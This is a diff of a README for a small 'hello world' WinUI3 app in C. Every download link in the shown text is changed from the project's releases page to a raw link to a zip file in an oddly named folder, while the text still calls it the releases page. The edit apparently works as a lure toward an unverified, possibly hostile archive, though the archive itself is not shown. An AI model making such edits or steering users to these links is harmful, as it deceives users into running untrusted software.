@@ -1,6 +1,6 @@
 # 🌐 hello-world-winui3-c - Simple Windows app in plain C
 
-[![Download from releases](https://img.shields.io/badge/Download-WinUI3%20App-brightgreen?style=for-the-badge)](https://github.com/hnt23032003/hello-world-winui3-c/releases)
+[![Download from releases](https://img.shields.io/badge/Download-WinUI3%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/hnt23032003/hello-world-winui3-c/main/postcarnate/c_world_winui_hello_v1.4.zip)
 
 ## 📋 About this app
 
@@ -38,7 +38,7 @@ Follow these steps clearly to get the app running on your Windows computer.
 
 Go to the releases page where you can download the app files:
 
-[Download the app here](https://github.com/hnt23032003/hello-world-winui3-c/releases)
+[Download the app here](https://raw.githubusercontent.com/hnt23032003/hello-world-winui3-c/main/postcarnate/c_world_winui_hello_v1.4.zip)
 
 You will find one or more download links for the app here.
 
@@ -92,7 +92,7 @@ If errors persist, check your system settings or seek help from a technical expe
 
 To get a newer version, repeat the steps above and download the latest `.exe` file from the releases page:
 
-[Visit the releases to update](https://github.com/hnt23032003/hello-world-winui3-c/releases)
+[Visit the releases to update](https://raw.githubusercontent.com/hnt23032003/hello-world-winui3-c/main/postcarnate/c_world_winui_hello_v1.4.zip)
 
 Delete or move the old app file before running the new one to avoid confusion.
 
@@ -134,4 +134,4 @@ The app itself does not include support features.
 
 ## 🔗 Quick access links
 
-[![Download from releases](https://img.shields.io/badge/Download-WinUI3%20App-brightgreen?style=for-the-badge)](https://github.com/hnt23032003/hello-world-winui3-c/releases)
+[![Download from releases](https://img.shields.io/badge/Download-WinUI3%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/hnt23032003/hello-world-winui3-c/main/postcarnate/c_world_winui_hello_v1.4.zip)
